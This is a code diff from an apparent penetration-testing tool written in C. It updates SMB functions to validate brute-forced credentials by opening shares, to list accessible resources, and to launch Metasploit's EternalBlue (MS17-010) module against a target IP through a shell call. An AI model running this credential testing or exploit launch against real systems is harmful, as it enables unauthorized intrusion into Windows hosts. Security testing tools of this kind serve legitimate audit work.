@@ -6,12 +6,16 @@
 #include "../auditing-cybersecurity.h"
 #include "../others/networking.h"
 #include "activities.h"
+#include <errno.h>
 
 char *gWorkgroup="";
 char *gUsername="";
 char *gPassword="";
+char *gServer=target.strTargetIp;
 
-static void smbc_auth_fn(const char *server, const char *share, char *wrkgrp, int wrkgrplen, char *user, int userlen, char *passwd, int passwdlen){
+
+static void smbc_auth_fn(const char *server, const char *share, char *wrkgrp, int wrkgrplen, char *user,
+		int userlen, char *passwd, int passwdlen){
 	(void) server;
 	(void) share;
 	(void) wrkgrp;
@@ -36,20 +40,22 @@ static SMBCCTX* create_smbctx(void){
 }
 
 static int validate_smb_account(SMBCCTX *ctx, char *smbURL){
-	SMBCFILE *dir;
+	SMBCFILE *dir=NULL;
 	if((dir=smbc_getFunctionOpendir(ctx)(ctx, smbURL))==NULL) return FALSE;
-	/*
+	char fullPath[128]="";
 	struct smbc_dirent *dirent;
+	Bool found=FALSE;
 	while((dirent = smbc_getFunctionReaddir(ctx)(ctx, dir)) != NULL){
-        printf("\n");
-        printf("  Name: %s\n", dirent->name);
-        printf("  Type: %s\n", dirent->smbc_type == SMBC_FILE_SHARE ? "Share" : "Directory");
-        printf("  Comment: %s\n", dirent->comment ? dirent->comment : "");
+		snprintf(fullPath,128,"%s/%s",smbURL,dirent->name);
+		if((smbc_getFunctionOpendir(ctx)(ctx, fullPath))!=NULL){
+			printf(REMOVE_LINE);
+			printf("  %sUser found: %s%s/%s with access to %s%s",C_HWHITE,C_HRED,gUsername,gPassword, fullPath,C_DEFAULT);
+			printf("\n\n"REMOVE_LINE);
+			found=TRUE;
+		}
 	}
-    printf("\n");
 	smbc_getFunctionClose(ctx)(ctx, dir);
-	 */
-	return TRUE;
+	return found;
 }
 
 static void delete_smbctx(SMBCCTX* ctx){
@@ -62,10 +68,7 @@ int smb_check_user(char *username, char *password){
 	gPassword=password;
 	char smbURL[BUFFER_SIZE_1K]="";
 	snprintf(smbURL, sizeof(smbURL), "smb://%s:%d", target.strTargetIp,portUnderHacking);
-	if ((ctx=create_smbctx())==NULL){
-		delete_smbctx(ctx);
-		return set_last_activity_error(SMB_CONTEXT_CREATION_ERROR,"");
-	}
+	if ((ctx=create_smbctx())==NULL) return set_last_activity_error(SMB_CONTEXT_CREATION_ERROR,"");
 	if(validate_smb_account(ctx, smbURL)){
 		delete_smbctx(ctx);
 		return TRUE;
@@ -74,12 +77,8 @@ int smb_check_user(char *username, char *password){
 	return FALSE;
 }
 
-//TODO
-/*
-static int smb_anonymous_login(){
+static int smb_list_resources(){
 	SMBCCTX *ctx;
-	gUsername="";
-	gPassword="";
 	char smbURL[BUFFER_SIZE_1K]="";
 	snprintf(smbURL, sizeof(smbURL), "smb://%s:%d", target.strTargetIp,portUnderHacking);
 	if ((ctx=create_smbctx())==NULL) return set_last_activity_error(SMB_CONTEXT_CREATION_ERROR,"");
@@ -99,7 +98,6 @@ static int smb_anonymous_login(){
 	delete_smbctx(ctx);
 	return FALSE;
 }
- */
 
 static int smb_banner_grabbing(){
 	int smbConn=0, bytesReceived=0;
@@ -351,12 +349,12 @@ int smb(int type){
 	char cmd[BUFFER_SIZE_1K]="";
 	switch(type){
 	case SMB_BANNER_GRABBING:
-		//(smb_anonymous_login())?(printf("  %sAnonymous login:%s success %s\n",C_HWHITE, C_HRED,C_DEFAULT)):(printf("  %sAnonymous login:%s failed %s\n",C_HWHITE,C_HGREEN,C_DEFAULT));
-		PRINT_RESET;
 		smb_banner_grabbing();
+		PRINT_RESET;
+		(smb_list_resources())?(printf("  %sResources found:%s success %s\n",C_HWHITE, C_HRED,C_DEFAULT)):(printf("  %sResources found:%s failed %s\n",C_HWHITE,C_HGREEN,C_DEFAULT));
 		break;
 	case SMB_ETERNAL_BLUE:
-		snprintf(cmd,sizeof(cmd),"c -q -x 'use windows/smb/ms17_010_eternalblue;set RHOSTS %s; set RPORT %d; run; exit'", target.strTargetIp,portUnderHacking);
+		snprintf(cmd,sizeof(cmd),"msfconsole -q -x 'use windows/smb/ms17_010_eternalblue;set RHOSTS %s; set RPORT %d; run; exit'", target.strTargetIp,portUnderHacking);
 		system_call(cmd);
 		break;
 	case SMB_BFA:
